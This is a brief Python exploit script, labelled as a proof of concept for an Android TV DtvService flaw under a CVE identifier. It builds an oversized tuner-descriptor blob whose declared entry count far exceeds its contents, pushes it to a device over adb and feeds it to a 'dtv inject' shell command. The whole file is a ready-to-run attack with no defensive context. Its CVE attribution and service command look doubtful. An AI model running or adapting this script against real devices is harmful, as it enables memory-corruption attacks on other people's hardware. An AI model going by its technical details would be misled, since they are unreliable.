#!/usr/bin/env python3
"""CVE-2024-0044 — Android TV DtvService. Oversized tuner-descriptor blob
pushed to the DTV service via binder-backed shell call."""
import struct, sys, subprocess
from pathlib import Path

def build() -> bytes:
    # tuner descriptor: [count:u32][entries...] with count > actual
    body = struct.pack("<I", 0x1000)
    body += b"".join(struct.pack("<HH", i, 0x40) for i in range(8))
    return body

def push_and_inject(host=None):
    p = Path("cve-2024-0044.bin"); p.write_bytes(build())
    adb = ["adb"] + (["-s", host] if host else [])
    subprocess.run(adb + ["push", str(p), "/data/local/tmp/dtv.bin"], capture_output=True)
    r = subprocess.run(adb + ["shell", "cmd", "dtv", "inject", "/data/local/tmp/dtv.bin"],
                       capture_output=True, text=True)
    print(r.stdout or r.stderr)

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else None
    push_and_inject(host)

if __name__ == "__main__":
    main()
